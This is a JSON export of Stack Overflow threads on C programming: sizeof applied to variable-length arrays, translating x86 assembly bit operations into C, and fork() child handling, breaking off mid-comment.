^\nlib/htslib/hfile_s3.c:335:23: warning: unused variable \u2018digest\u2019 [-Wunused-variable]\n         unsigned char digest[DIGEST_BUFSIZ];\n                       ^\nerror: command 'x86_64-linux-gnu-gcc' failed with exit status 1\n</code></pre>\n\n<p>I am kind of lost on this and googling the errors has not made me any wiser. I feel like it is a 'you are still using windows' kind of problem. Any help would be much appreciated. </p>\n"}, {"tags": ["c", "gcc", "sizeof", "variable-length-array"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 9, "creation_date": 1517998444, "post_id": 48661057, "comment_id": 84319581, "body": "<code>a[i++]</code> is not an expression of a VLA type. It&#39;s ultimately a subscript expression, and has the type <code>int</code>. Beyond that, even for VLA&#39;s <code>a[0]</code> is a constraint violation."}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 3, "creation_date": 1517998682, "post_id": 48661057, "comment_id": 84319739, "body": "The length of the VLA is determined at the time it is defined. In the above code, the length will be 0, so the VLA will have no elements. The size does not change after it has been defined. Also, the length needs to be greater than zero, otherwise it&#39;s <i>undefined behavior</i>."}, {"owner": {"reputation": 4649, "user_id": 5601284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/qVVND.jpg?s=128&g=1", "display_name": "byxor", "link": "https://stackoverflow.com/users/5601284/byxor"}, "edited": false, "score": 0, "creation_date": 1517998689, "post_id": 48661057, "comment_id": 84319743, "body": "I didn&#39;t know C had VLAs. I learned something new unless OP tagged C instead of C++."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 4649, "user_id": 5601284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/qVVND.jpg?s=128&g=1", "display_name": "byxor", "link": "https://stackoverflow.com/users/5601284/byxor"}, "edited": false, "score": 1, "creation_date": 1517998741, "post_id": 48661057, "comment_id": 84319765, "body": "@byxor - It&#39;s C++ that doesn&#39;t have them other than as compiler extensions (because said compilers also support C)."}, {"owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 0, "creation_date": 1517998903, "post_id": 48661057, "comment_id": 84319876, "body": "try <code>int a[i][i]; sizeof(a[i++])</code> that will be sizeof(vla)"}, {"owner": {"reputation": 427, "user_id": 1548298, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/24c66a8e9bba418dfdbc1a5f0419a2de?s=128&d=identicon&r=PG", "display_name": "Maquefel", "link": "https://stackoverflow.com/users/1548298/maquefel"}, "edited": false, "score": 1, "creation_date": 1517999337, "post_id": 48661057, "comment_id": 84320175, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/8225776/why-does-sizeofx-not-increment-x\">Why does sizeof(x++) not increment x?</a>"}, {"owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 5, "creation_date": 1517999427, "post_id": 48661057, "comment_id": 84320263, "body": "it&#39;s about sizeof+vla, it&#39;s not a duplicate of that question"}], "answers": [{"tags": [], "owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "is_accepted": false, "score": 9, "last_activity_date": 1519084055, "last_edit_date": 1519084055, "creation_date": 1517999342, "answer_id": 48661458, "question_id": 48661057, "link": "https://stackoverflow.com/questions/48661057/sizeof-operator-with-variable-length-array-type/48661458#48661458", "title": "Sizeof operator with variable-length array type", "body": "<p>The expression in sizeof in your example is int, and not vla. If it were vla, all would work:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i = 5;\n    int a[i][i];\n    printf(\"%zu\\n\",sizeof(a[--i]));\n    printf(\"%d\\n\",i); // Here, print 4\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9095, "user_id": 8542346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11b206b49cec657d28a5876f8330780e?s=128&d=identicon&r=PG&f=1", "display_name": "H.S.", "link": "https://stackoverflow.com/users/8542346/h-s"}, "is_accepted": false, "score": 3, "last_activity_date": 1517999407, "creation_date": 1517999407, "answer_id": 48661487, "question_id": 48661057, "link": "https://stackoverflow.com/questions/48661057/sizeof-operator-with-variable-length-array-type/48661487#48661487", "title": "Sizeof operator with variable-length array type", "body": "<p>From <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.5.3.4p2\" rel=\"nofollow noreferrer\">C Standards#6.5.3.4p2</a> [<em>emphasis mine</em>]</p>\n\n<blockquote>\n  <p>The sizeof operator yields the size (in bytes) of its operand, which may be an expression or the parenthesized name of a type. The size is determined from the type of the operand. <strong>The result is an integer. If the type of the operand is a variable length array type, the operand is evaluated; otherwise, the operand is not evaluated and the result is an integer constant</strong>.</p>\n</blockquote>\n\n<p>In the expression:</p>\n\n<pre><code>sizeof(a[i++])\n</code></pre>\n\n<p>the <code>a[i++]</code> is not VLA but a subscript operator expression resulting in an integer. So, the operand is not evaluated and for the same reason, compiler is giving warning on this statement:</p>\n\n<blockquote>\n  <p><code>warning: expression with side effects has no effect in an unevaluated context</code></p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "is_accepted": false, "score": 3, "last_activity_date": 1517999502, "creation_date": 1517999502, "answer_id": 48661523, "question_id": 48661057, "link": "https://stackoverflow.com/questions/48661057/sizeof-operator-with-variable-length-array-type/48661523#48661523", "title": "Sizeof operator with variable-length array type", "body": "<p>To take the word of a clone of a normative references for it:</p>\n\n<p><a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.5.3.4\" rel=\"nofollow noreferrer\"><strong>6.5.3.4 - The sizeof and _Alignof operators</strong></a></p>\n\n<blockquote>\n  <p>The sizeof operator yields the size (in bytes) of its operand, which\n  may be an expression or the parenthesized name of a type. The size is\n  determined from the type of the operand. The result is an integer. If\n  the type of the operand is a variable length array type, the operand\n  is evaluated; otherwise, the operand is not evaluated and the result\n  is an integer constant.</p>\n</blockquote>\n\n<p>It would be evaluated, if you fix your example to produce an expression with VLA type, one such way </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i = 1;\n    int a[5][i];\n    printf(\"%zu\\n\",sizeof(a[i++]));\n    printf(\"%d\\n\",i);\n    return 0;\n}\n</code></pre>\n\n<p><a href=\"http://coliru.stacked-crooked.com/a/e5839a35591f5551\" rel=\"nofollow noreferrer\">Prints <code>2</code> on the last line</a>, because <code>i</code> is incremented.</p>\n"}, {"comments": [{"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1518004303, "post_id": 48661592, "comment_id": 84323459, "body": "Off topic to the original question but any idea why the standard provides a special case for the expressions of type VLA?"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 1, "creation_date": 1518004856, "post_id": 48661592, "comment_id": 84323809, "body": "@Ajay Assuming <code>int a[i];</code>, expression <code>sizeof a</code> must be able to calculate correct result at runtime, because value of <code>i</code> is not known at compile time."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1518008773, "post_id": 48661592, "comment_id": 84326422, "body": "@AjayBrahmakshatriya Because the size is only set in run-time, so that it cannot necessarily get pre-calculated at compile-time."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 19, "last_activity_date": 1517999674, "creation_date": 1517999674, "answer_id": 48661592, "question_id": 48661057, "link": "https://stackoverflow.com/questions/48661057/sizeof-operator-with-variable-length-array-type/48661592#48661592", "title": "Sizeof operator with variable-length array type", "body": "<p>First of all, please note that an array cannot have size zero, be it a VLA or not. So your code invokes undefined behavior.</p>\n\n<p>C11 6.7.6.2/5</p>\n\n<blockquote>\n  <p>\"If the size is an expression that is not an integer constant expression:\" /--/ \"...each time it is evaluated it shall have a value greater than zero.\"</p>\n</blockquote>\n\n<hr>\n\n<p>As for the actual problem, <code>a[i++]</code> is of type <code>int</code>, not of VLA type. </p>\n\n<p>In order to get the side-effect, you must involve the VLA array type itself, such as <code>sizeof(a)</code>. Only then is the operand evaluated for side effects. One example to illustrate this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i=1, j=1;\n    int a[i][j];\n    int b[1][1];\n\n    (void) sizeof(a[--i]);\n    (void) sizeof(b[--j]);\n    printf(\"%d %d\", i, j);\n\n    return 0;\n}\n</code></pre>\n\n<p>Here <code>i</code> ends up as 0 since the first <code>sizeof</code> is evaluated because of the VLA, but <code>j</code> remains 1 because <code>--j</code> was part of a <code>sizeof</code> for a regular array.</p>\n"}], "owner": {"reputation": 30168, "user_id": 5612562, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/gzBQY.jpg?s=128&g=1", "display_name": "msc", "link": "https://stackoverflow.com/users/5612562/msc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1418, "favorite_count": 3, "accepted_answer_id": 48661592, "answer_count": 4, "score": 13, "last_activity_date": 1519084055, "creation_date": 1517998236, "last_edit_date": 1518015015, "question_id": 48661057, "link": "https://stackoverflow.com/questions/48661057/sizeof-operator-with-variable-length-array-type", "title": "Sizeof operator with variable-length array type", "body": "<p>According to <a href=\"http://en.cppreference.com/w/c/language/sizeof\" rel=\"nofollow noreferrer\">cppreference</a>: </p>\n\n<blockquote>\n  <p>If the type of <em>expression</em> is a <strong>variable-length array</strong> type, <strong><em>expression</em>\n  is evaluated</strong> and the size of the array it evaluates to is calculated\n  at run time.</p>\n</blockquote>\n\n<p>It means: if the type of <em>expression</em> is a VLA type, then <em>expression</em> is evaluated. For example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i = 0;\n    int a[i];\n    printf(\"%zu\\n\",sizeof(a[i++]));\n    printf(\"%d\\n\",i); // Here, print 0 instead of 1\n    return 0;\n}\n</code></pre>\n\n<p>So, according to the reference, here <code>i</code> becomes <code>1</code>. But, with my GCC compiler, <code>i</code> prints as <code>0</code>.</p>\n\n<p>See <a href=\"https://wandbox.org/permlink/u15UOXihrmkO2Ct6\" rel=\"nofollow noreferrer\">Wandbox Demo</a>.</p>\n"}, {"tags": ["c", "assembly", "reverse-engineering", "att"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1517998218, "post_id": 48660934, "comment_id": 84319434, "body": "Shifts are not <i>necessarily</i> &#39;bitwise operators. A well-established use is <code>x&lt;&lt;1</code> to stand for &quot;multiply by 2&quot;. A C compiler might even translate an explicit multiplication by a power of 2 into a shift."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1517998324, "post_id": 48660934, "comment_id": 84319504, "body": "<a href=\"https://godbolt.org/\" rel=\"nofollow noreferrer\">This playground</a> may help."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1517998413, "post_id": 48660934, "comment_id": 84319558, "body": "The answer to <a href=\"https://stackoverflow.com/a/1776587/7478597\">SO: Is there a complete x86 assembly language reference that uses AT&amp;T syntax? (closed)</a> mentions <a href=\"https://docs.oracle.com/cd/E19253-01/817-5477/817-5477.pdf\" rel=\"nofollow noreferrer\">x86 Assembly Language Reference Manual</a>."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1517998422, "post_id": 48660934, "comment_id": 84319563, "body": "@usr2564301 The &#39;bitwise operators&#39; is a de facto standard name for the operators <code>| &amp; ^ &lt;&lt; &gt;&gt; ~</code> (and their compound assignment versions). No matter how they are used by the program."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1517998451, "post_id": 48660934, "comment_id": 84319589, "body": "&quot;Is there a standardized guide/&quot;cheat sheet&quot; for Assembly-to-C conversions?&quot; Hardly. The usual is the opposite way. :-)"}, {"owner": {"reputation": 29966, "user_id": 637669, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0227e5d5eaceb8ae2f751df38d421764?s=128&d=identicon&r=PG", "display_name": "arrowd", "link": "https://stackoverflow.com/users/637669/arrowd"}, "edited": false, "score": 0, "creation_date": 1517998571, "post_id": 48660934, "comment_id": 84319674, "body": "I see you are asking many questions about decompiling. Are you implementing something like IDA&#39;s Hex-Rays? If so, take a look at Avast&#39;s RetDec decompiler, which is opensource."}, {"owner": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "reply_to_user": {"reputation": 29966, "user_id": 637669, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0227e5d5eaceb8ae2f751df38d421764?s=128&d=identicon&r=PG", "display_name": "arrowd", "link": "https://stackoverflow.com/users/637669/arrowd"}, "edited": false, "score": 0, "creation_date": 1517999914, "post_id": 48660934, "comment_id": 84320624, "body": "@arrowd Yes, I should start learning to use IDA, thanks for the suggestion"}, {"owner": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1518000058, "post_id": 48660934, "comment_id": 84320722, "body": "@Scheff Thanks, that should prove quite helpful."}, {"owner": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1518000161, "post_id": 48660934, "comment_id": 84320810, "body": "@usr2564301 - That&#39;s the exact sort of information I was looking for, thanks. I&#39;m sure there&#39;s more similar hints on interpreting assembly code out there.."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1518016618, "post_id": 48660934, "comment_id": 84332090, "body": "Why do you keep asking and deleting questions on the same subject?"}, {"owner": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "edited": false, "score": 0, "creation_date": 1518035244, "post_id": 48660934, "comment_id": 84343596, "body": "I\u2019d be surprised if you had evidence to back that statement. I wrote 1 question about assembly last week and deleted that after it was downvoted and I was told the question was unconventional (\u201cweird\u201d). That\u2019s the only deleting I have done recently."}], "answers": [{"tags": [], "owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "is_accepted": true, "score": 0, "last_activity_date": 1517998980, "creation_date": 1517998980, "answer_id": 48661321, "question_id": 48660934, "link": "https://stackoverflow.com/questions/48660934/a-reference-for-converting-assembly-shl-or-and-shr-operations-into-c/48661321#48661321", "title": "A reference for converting assembly &#39;shl&#39;, &#39;OR&#39;, &#39;AND&#39;, &#39;SHR&#39; operations into C?", "body": "<p><code>while (i &lt; 32) { val = (val &lt;&lt; 1) | (x &amp; 1); x = x &gt;&gt; 1; i++; }</code> except val and the return value should be unsigned and they aren't in your template. The function returns the bits in x reversed.</p>\n\n<p>The actual answer to your question is more complicated and is pretty much: no there is no such guide and it can't exist because compilation loses information and you can't recreate that lost information from assembler. But you can often make a good educated guess.</p>\n"}, {"comments": [{"owner": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "edited": false, "score": 0, "creation_date": 1518012436, "post_id": 48665471, "comment_id": 84329045, "body": "Excellent explanation. Quite easy to understand now! I didn&#39;t realize it was that simple. Feel free to ignore this next question, but I&#39;m now asked to &quot;Describe in English what function f computes:&quot; and was wondering if you happened to immediately recognize what the function was doing in layman&#39;s terms."}, {"owner": {"reputation": 2572, "user_id": 5784350, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be79d2a9a367e3b66c42928c0b095a7?s=128&d=identicon&r=PG&f=1", "display_name": "Tommylee2k", "link": "https://stackoverflow.com/users/5784350/tommylee2k"}, "reply_to_user": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "edited": false, "score": 1, "creation_date": 1518013818, "post_id": 48665471, "comment_id": 84330030, "body": "left shifting one register 32 times, while right shifting the other. My guess is this function reverses the order of x&#39;s bits"}], "tags": [], "owner": {"reputation": 2572, "user_id": 5784350, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be79d2a9a367e3b66c42928c0b095a7?s=128&d=identicon&r=PG&f=1", "display_name": "Tommylee2k", "link": "https://stackoverflow.com/users/5784350/tommylee2k"}, "is_accepted": false, "score": 1, "last_activity_date": 1518011263, "creation_date": 1518011263, "answer_id": 48665471, "question_id": 48660934, "link": "https://stackoverflow.com/questions/48660934/a-reference-for-converting-assembly-shl-or-and-shr-operations-into-c/48665471#48665471", "title": "A reference for converting assembly &#39;shl&#39;, &#39;OR&#39;, &#39;AND&#39;, &#39;SHR&#39; operations into C?", "body": "<blockquote>\n  <p>For example, can shll, shrl, orl, and andl simply be written using\n  their direct C equivalents (&lt;&lt;,>>,|,&amp;), or is there some more nuance\n  to it?</p>\n</blockquote>\n\n<p>they can. Let's examine the loop body step-by-step:</p>\n\n<pre><code>  shll $1, %eax    // shift left eax by 1, same as \"eax&lt;&lt;1\" or even \"eax*=2\"\n  movl %edx, %ebx\n  andl $1, %ebx    // ebx &amp;= 1\n  orl %ebx, %eax   // eax |= ebx\n  shrl $1, %edx    // shift right edx by 1, same as \"edx&gt;&gt;1\" = \"edx/=2\"\n</code></pre>\n\n<p>gets us to</p>\n\n<pre><code>  %eax *=2\n  %ebx = %edx        \n  %ebx = %ebx &amp; 1       \n  %eax |= %ebx     \n  %edx /= 2\n</code></pre>\n\n<p>ABI tells us (<code>8(%ebp), %edx</code>) that %edx is x, and %eax (return value) is val:</p>\n\n<pre><code>  val *=2\n  %ebx = x           // a\n  %ebx = %ebx &amp; 1    // b\n  val |= %ebx        // c\n  x /= 2\n</code></pre>\n\n<p>combine a,b,c: #2 insert a into b:</p>\n\n<pre><code>  val *=2\n  %ebx = (x &amp; 1)  // b\n  val |= %ebx     // c\n  x /= 2\n</code></pre>\n\n<p>combine a,b,c: #2 insert b into c:</p>\n\n<pre><code>  val *=2\n  val |= (x &amp; 1)\n  x /= 2\n</code></pre>\n\n<p>final step: combine both 'val =' into one</p>\n\n<pre><code>  val = 2*val | (x &amp; 1)\n  x /= 2\n</code></pre>\n"}], "owner": {"reputation": 705, "user_id": 3511695, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/PhOpf.png?s=128&g=1", "display_name": "velkoon", "link": "https://stackoverflow.com/users/3511695/velkoon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1224, "favorite_count": 0, "accepted_answer_id": 48661321, "answer_count": 2, "score": 1, "last_activity_date": 1518011263, "creation_date": 1517997868, "last_edit_date": 1518001792, "question_id": 48660934, "link": "https://stackoverflow.com/questions/48660934/a-reference-for-converting-assembly-shl-or-and-shr-operations-into-c", "title": "A reference for converting assembly &#39;shl&#39;, &#39;OR&#39;, &#39;AND&#39;, &#39;SHR&#39; operations into C?", "body": "<p>I'm to convert the following AT&amp;T x86 assembly into C:</p>\n\n<pre><code>  movl 8(%ebp), %edx\n  movl $0, %eax\n  movl $0, %ecx\n  jmp .L2\n.L1\n  shll $1, %eax\n  movl %edx, %ebx\n  andl $1, %ebx\n  orl %ebx, %eax\n  shrl $1, %edx\n  addl $1, %ecx\n.L2\n  cmpl $32, %ecx\n  jl   .L1\n  leave\n</code></pre>\n\n<p>But must adhere to the following skeleton code:</p>\n\n<pre><code>int f(unsigned int x) {\n    int val = 0, i = 0;\n    while(________) {\n        val = ________________;\n        x = ________________;\n        i++;\n    }\n    return val;\n}\n</code></pre>\n\n<p>I can tell that the snippet</p>\n\n<pre><code>.L2\n  cmpl $32, %ecx\n  jl   .L1\n</code></pre>\n\n<p>can be interpreted as <code>while(i&lt;32)</code>. I also know that <code>x</code> is stored in <code>%edx</code>, <code>val</code> in <code>%eax</code>, and <code>i</code> in <code>%ecx</code>. However, I'm having a hard time converting the assembly within the <code>while</code>/<code>.L1</code> loop into condensed high-level language that fits into the provided skeleton code. For example, can <code>shll</code>, <code>shrl</code>, <code>orl</code>, and <code>andl</code> simply be written using their direct C equivalents (<code>&lt;&lt;</code>,<code>&gt;&gt;</code>,<code>|</code>,<code>&amp;</code>), or is there some more nuance to it?</p>\n\n<p>Is there a standardized guide/\"cheat sheet\" for Assembly-to-C conversions? </p>\n\n<p>I understand assembly to high-level conversion is not always clear-cut, but there are certainly patterns in assembly code that can be consistently interpreted as certain C operations.</p>\n"}, {"tags": ["c", "unix", "fork"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1517998242, "post_id": 48660915, "comment_id": 84319446, "body": "If you write to the error stream instead, are the results different? The error stream is normally unbuffered."}, {"owner": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "edited": false, "score": 0, "creation_date": 1517998538, "post_id": 48660915, "comment_id": 84319646, "body": "Your code would be a <i>lot</i> simpler to understand if you used functions to do the work instead of all inline inside <code>main()</code>."}], "answers": [{"comments": [{"owner": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "edited": false, "score": 0, "creation_date": 1517998831, "post_id": 48661200, "comment_id": 84319825, "body": "and don&#39;t forget to <code>wait()</code> for <i>all</i> of the children."}, {"owner": {"reputation": 19910, "user_id": 8012646, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/T8yOZ.png?s=128&g=1", "display_name": "\u30ed\u30fc\u30a6", "link": "https://stackoverflow.com/users/8012646/%e3%83%ad%e3%83%bc%e3%82%a6"}, "reply_to_user": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "edited": false, "score": 0, "creation_date": 1517998836, "post_id": 48661200, "comment_id": 84319830, "body": "@Alnitak Thanks!"}, {"owner": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "edited": false, "score": 0, "creation_date": 1517999007, "post_id": 48661200, "comment_id": 84319948, "body": "you also need to ensure that each child does actually explicitly <code>exit()</code>  (or <code>return</code> after the call to <code>task_child</code>) otherwise the child processes&#39; flow of execution will continue after the <code>switch</code>."}, {"owner": {"reputation": 19910, "user_id": 8012646, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/T8yOZ.png?s=128&g=1", "display_name": "\u30ed\u30fc\u30a6", "link": "https://stackoverflow.com/users/8012646/%e3%83%ad%e3%83%bc%e3%82%a6"}, "reply_to_user": {"reputation": 311848, "user_id": 6782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dc8c4ddd99b446c28d2e1546c457e508?s=128&d=identicon&r=PG", "display_name": "Alnitak", "link": "https://stackoverflow.com/users/6782/alnitak"}, "edited": false, "score": 0, "creation_date": 1517999372, "post_id": 48661200, "comment_id": 84320208, "body": "@Alnitak thanks, better to explicitly call <code>exit()</code> in the <code>switch</code> than relying on the task functions having a call to <code>exit()</code>."}, {"owner": {"reputation": 311848, "user_id": 6782, 